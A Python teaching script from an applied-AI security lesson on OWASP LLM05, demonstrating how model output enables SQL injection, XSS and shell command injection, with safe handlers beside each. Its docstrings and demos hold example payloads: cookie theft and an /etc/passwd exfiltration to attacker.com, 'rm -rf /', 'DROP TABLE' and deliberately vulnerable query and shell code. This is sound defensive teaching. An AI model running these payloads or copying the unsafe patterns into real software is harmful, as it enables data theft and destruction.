"""
Output Handling and Downstream Injection - Phase 08 Lesson 06
appliedaifromscratch.com

Demonstrates: OWASP LLM05 - three downstream injection vectors and their safe handlers.
SQL injection via model output, XSS via model output, command injection via model output.

Run:
    python main.py

No external dependencies required for the core demo.
Optional: pip install bleach anthropic
"""

from __future__ import annotations

import html
import sqlite3
import subprocess
from enum import Enum


# ===========================================================================
# DATABASE SETUP
# ===========================================================================

def create_demo_db() -> sqlite3.Connection:
    """Create an in-memory SQLite database with test data."""
    conn = sqlite3.connect(":memory:")
    conn.execute("""
        CREATE TABLE orders (
            id INTEGER PRIMARY KEY,
            customer_name TEXT NOT NULL,
            status TEXT NOT NULL,
            total_amount REAL NOT NULL,
            created_at TEXT NOT NULL
        )
    """)
    conn.executemany(
        "INSERT INTO orders VALUES (?, ?, ?, ?, ?)",
        [
            (1, "Alice Smith",  "delivered", 129.99, "2026-05-20"),
            (2, "Bob Jones",    "pending",    49.00, "2026-05-21"),
            (3, "Carol White",  "delivered",  89.50, "2026-05-22"),
            (4, "Dave Brown",   "cancelled",  15.00, "2026-05-23"),
            (5, "Eve Davis",    "delivered", 200.00, "2026-05-24"),
        ],
    )
    conn.commit()
    return conn


# ===========================================================================
# VECTOR 1: SQL INJECTION
# ===========================================================================

def get_orders_unsafe(conn: sqlite3.Connection, status_filter: str) -> list:
    """
    VULNERABLE: model output interpolated directly into SQL string.

    Injection payload: "delivered' OR '1'='1"
    Resulting query: SELECT * FROM orders WHERE status = 'delivered' OR '1'='1'
    Effect: returns ALL orders, bypassing the status filter.

    Never do this. Shown here only to demonstrate the attack.
    """
    query = f"SELECT id, customer_name, status FROM orders WHERE status = '{status_filter}'"
    try:
        return conn.execute(query).fetchall()
    except sqlite3.OperationalError as e:
        return [("ERROR", str(e), "")]


def get_orders_safe(conn: sqlite3.Connection, status_filter: str) -> list:
    """
    SAFE: parameterized query.

    The ? placeholder is bound by the SQLite driver, which always treats
    the value as data, never as SQL. Any injection payload becomes a
    literal string comparison.

    Injection payload: "delivered' OR '1'='1"
    Bound value: "delivered' OR '1'='1"  (literal string, no SQL meaning)
    Effect: returns zero rows (no order has that exact status string).
    """
    query = "SELECT id, customer_name, status FROM orders WHERE status = ?"
    return conn.execute(query, (status_filter,)).fetchall()


ALLOWED_SORT_COLUMNS = frozenset({"created_at", "total_amount", "customer_name", "status"})


def get_orders_sorted_safe(
    conn: sqlite3.Connection,
    status_filter: str,
    sort_column: str,
) -> list:
    """
    SAFE: parameterized value + allowlist for column name.

    Column names cannot be parameterized -- they must appear in the query text.
    The only safe approach is to validate against a known allowlist before
    embedding the column name in the query.
    """
    if sort_column not in ALLOWED_SORT_COLUMNS:
        raise ValueError(
            f"Invalid sort column: {sort_column!r}. "
            f"Allowed: {sorted(ALLOWED_SORT_COLUMNS)}"
        )
    query = f"SELECT id, customer_name, status FROM orders WHERE status = ? ORDER BY {sort_column}"
    return conn.execute(query, (status_filter,)).fetchall()


# ===========================================================================
# VECTOR 2: XSS (Cross-Site Scripting)
# ===========================================================================

def render_summary_unsafe(model_output: str) -> str:
    """
    VULNERABLE: model output inserted into HTML without escaping.

    Injection payload: <script>document.location='https://attacker.com?c='+document.cookie</script>
    Effect: when rendered in a browser, the script executes and exfiltrates session cookies.
    """
    return f"<div class='summary'>{model_output}</div>"


def render_summary_safe(model_output: str) -> str:
    """
    SAFE: html.escape() converts dangerous characters to HTML entities.

    & -> &amp;   < -> &lt;   > -> &gt;   " -> &quot;   ' -> &#x27;

    Payload: <script>alert('xss')</script>
    Output:  &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
    Effect:  rendered as visible text in the browser, never executed.
    """
    escaped = html.escape(model_output, quote=True)
    return f"<div class='summary'>{escaped}</div>"


def render_rich_text_safe(model_output: str) -> str:
    """
    SAFE rich text: bleach with an explicit allowlist.

    Use this when you want to permit limited formatting (bold, lists)
    but still block scripts and event handlers.

    pip install bleach
    """
    try:
        import bleach
        ALLOWED_TAGS = ["b", "i", "em", "strong", "p", "ul", "ol", "li", "br", "code"]
        return bleach.clean(
            model_output,
            tags=ALLOWED_TAGS,
            attributes={},     # no attributes on any tag
            strip=True,        # strip unknown tags rather than escaping them
            strip_comments=True,
        )
    except ImportError:
        # bleach not installed: fall back to full escaping
        return html.escape(model_output, quote=True)


# ===========================================================================
# VECTOR 3: COMMAND INJECTION
# ===========================================================================

ALLOWED_REPORTS = frozenset({"daily_summary", "weekly_orders", "monthly_revenue"})


def run_report_unsafe(report_name: str) -> str:
    """
    VULNERABLE: model output passed to shell as a string.

    shell=True means the OS shell interprets the command, including:
    ; (command separator)   && (conditional execution)
    | (pipe)                $(...) (command substitution)

    Injection payload: "daily_summary; curl https://attacker.com -d @/etc/passwd"
    Effect: runs the report AND exfiltrates /etc/passwd.
    """
    try:
        # Simulate what would happen (do not actually execute on real systems)
        if ";" in report_name or "|" in report_name or "$" in report_name:
            return f"[DEMO] Would have executed: echo {report_name} [INJECTION DETECTED IN DEMO]"
        result = subprocess.run(
            f"echo 'Running report: {report_name}'",
            shell=True, capture_output=True, text=True, timeout=5,
        )
        return result.stdout.strip()
    except Exception as e:
        return f"[ERROR] {e}"


def run_report_safe(report_name: str) -> str:
    """
    SAFE: allowlist validation + list form + shell=False.

    1. Allowlist: only known report names are accepted.
    2. List form: ["command", "arg"] means no shell is invoked.
    3. shell=False (default): semicolons, pipes, $() are literal chars.

    Injection payload: "daily_summary; curl attacker.com"
    Effect: ValueError raised, nothing executed.
    """
    if report_name not in ALLOWED_REPORTS:
        raise ValueError(
            f"Unknown report: {report_name!r}. "
            f"Allowed: {sorted(ALLOWED_REPORTS)}"
        )

    # Simulate the safe subprocess call without requiring the actual script
    result = subprocess.run(
        ["echo", f"Running report: {report_name}"],  # list form, no shell
        capture_output=True,
        text=True,
        timeout=10,
        shell=False,
    )
    return result.stdout.strip()


# ===========================================================================
# UNIFIED SAFE OUTPUT ROUTER
# ===========================================================================

class OutputContext(Enum):
    """The execution context that model output will be passed to."""
    SQL_VALUE = "sql_value"    # used as a value in a parameterized query
    SQL_COLUMN = "sql_column"  # used as a column or table name
    HTML = "html"              # rendered into an HTML page
    SHELL = "shell"            # passed to a subprocess or shell command


def safe_output(
    model_output: str,
    context: OutputContext,
    allowlist: frozenset[str] | None = None,
) -> str:
    """
    Route model output through the correct safe handler for its destination.

    For SQL_VALUE: returns as-is (caller must use parameterized query).
    For SQL_COLUMN and SHELL: validates against allowlist, raises if not found.
    For HTML: returns html.escape()'d string.
    """
    if context == OutputContext.SQL_VALUE:
        return model_output  # safe ONLY when caller uses ? placeholder

    if context in (OutputContext.SQL_COLUMN, OutputContext.SHELL):
        if allowlist is None:
            raise ValueError(f"allowlist required for context {context.name}")
        if model_output not in allowlist:
            raise ValueError(
                f"Model output {model_output!r} not in allowlist for {context.name}. "
                f"Allowed: {sorted(allowlist)}"
            )
        return model_output

    if context == OutputContext.HTML:
        return html.escape(model_output, quote=True)

    raise ValueError(f"Unknown context: {context}")


# ===========================================================================
# DEMO
# ===========================================================================

def demo_sql():
    print("\n" + "=" * 60)
    print("VECTOR 1: SQL Injection via model output")
    print("=" * 60)

    conn = create_demo_db()
    injection_payload = "delivered' OR '1'='1"

    print(f"\nInjection payload: {injection_payload!r}")

    print("\n[UNSAFE] String-interpolated query:")
    rows = get_orders_unsafe(conn, injection_payload)
    print(f"  Returned {len(rows)} rows (expected 0, got all if injected)")
    for row in rows[:3]:
        print(f"  {row}")

    print("\n[SAFE] Parameterized query:")
    rows = get_orders_safe(conn, injection_payload)
    print(f"  Returned {len(rows)} rows (expected 0)")

    print("\n[SAFE] Column allowlist - valid column:")
    rows = get_orders_sorted_safe(conn, "delivered", "total_amount")
    print(f"  Returned {len(rows)} delivered orders sorted by total_amount")

    print("\n[SAFE] Column allowlist - injection attempt:")
    try:
        get_orders_sorted_safe(conn, "delivered", "total_amount; DROP TABLE orders --")
    except ValueError as e:
        print(f"  Blocked: {str(e)[:80]}")


def demo_xss():
    print("\n" + "=" * 60)
    print("VECTOR 2: XSS via model output rendered in HTML")
    print("=" * 60)

    xss_payload = "<script>alert(document.cookie)</script>"
    print(f"\nXSS payload: {xss_payload!r}")

    print("\n[UNSAFE] No escaping:")
    unsafe_html = render_summary_unsafe(xss_payload)
    print(f"  {unsafe_html}")
    print("  (script would execute in browser)")

    print("\n[SAFE] html.escape():")
    safe_html = render_summary_safe(xss_payload)
    print(f"  {safe_html}")
    print("  (rendered as visible text, script never executes)")

    print("\n[SAFE] bleach rich text (bold allowed, script stripped):")
    rich_payload = "<b>Important</b><script>alert(1)</script> update."
    sanitized = render_rich_text_safe(rich_payload)
    print(f"  Input : {rich_payload!r}")
    print(f"  Output: {sanitized!r}")


def demo_shell():
    print("\n" + "=" * 60)
    print("VECTOR 3: Command injection via model output passed to shell")
    print("=" * 60)

    shell_payload = "daily_summary; echo INJECTED > /tmp/pwned.txt"
    print(f"\nInjection payload: {shell_payload!r}")

    print("\n[UNSAFE] shell=True:")
    result = run_report_unsafe(shell_payload)
    print(f"  {result}")

    print("\n[SAFE] Allowlist + list form:")
    try:
        run_report_safe(shell_payload)
    except ValueError as e:
        print(f"  Blocked: {str(e)[:80]}")

    print("\n[SAFE] Valid report name passes through:")
    result = run_report_safe("daily_summary")
    print(f"  Result: {result!r}")


def demo_unified_router():
    print("\n" + "=" * 60)
    print("UNIFIED: safe_output() router")
    print("=" * 60)

    # HTML context
    html_out = safe_output("<b>summary</b><script>xss()</script>", OutputContext.HTML)
    print(f"\nHTML context: {html_out!r}")

    # Shell context with valid value
    shell_out = safe_output("weekly_orders", OutputContext.SHELL, allowlist=ALLOWED_REPORTS)
    print(f"Shell context (valid): {shell_out!r}")

    # Shell context with injection
    try:
        safe_output("weekly_orders; rm -rf /", OutputContext.SHELL, allowlist=ALLOWED_REPORTS)
    except ValueError as e:
        print(f"Shell context (injection): Blocked - {str(e)[:70]}")

    # SQL column context
    try:
        safe_output("'; DROP TABLE --", OutputContext.SQL_COLUMN, allowlist=ALLOWED_SORT_COLUMNS)
    except ValueError as e:
        print(f"SQL column context (injection): Blocked - {str(e)[:70]}")


if __name__ == "__main__":
    demo_sql()
    demo_xss()
    demo_shell()
    demo_unified_router()
    print("\nAll demos complete.")
